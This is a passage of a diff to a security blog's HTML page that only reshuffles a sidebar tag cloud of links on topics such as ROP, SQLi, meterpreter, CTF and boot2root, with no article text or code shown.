+              <a href="https://maggick.fr/tag/rop.html">ROP</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/drupal.html">drupal</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/server.html">server</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/git.html">git</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/programming.html">programming</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/leak.html">leak</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/devops.html">devops</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/smb.html">smb</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/suid.html">SUID</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/mail.html">mail</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
+              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
             </li>
             <li class="tag tag-3">
               <a href="https://maggick.fr/tag/blog.html">blog</a>
@@ -1031,40 +944,127 @@ and make it compute the addresses automatically:</p>
               <a href="https://maggick.fr/tag/code-review.html">code review</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/python.html">python</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ssl.html">SSL</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/rop.html">ROP</a>
+              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/windows.html">windows</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
+              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/leak.html">leak</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/hash.html">hash</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/waf.html">WAF</a>
             </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
             </li>
             <li class="tag tag-3">
               <a href="https://maggick.fr/tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/screen.html">screen</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bypass.html">bypass</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/mail.html">mail</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/python.html">python</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/security.html">security</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ssl.html">SSL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/postgresql.html">postgresql</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/server.html">server</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/smb.html">smb</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/cve.html">cve</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/ctf.html">ctf</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
             </li>
     </ul>
 </section>
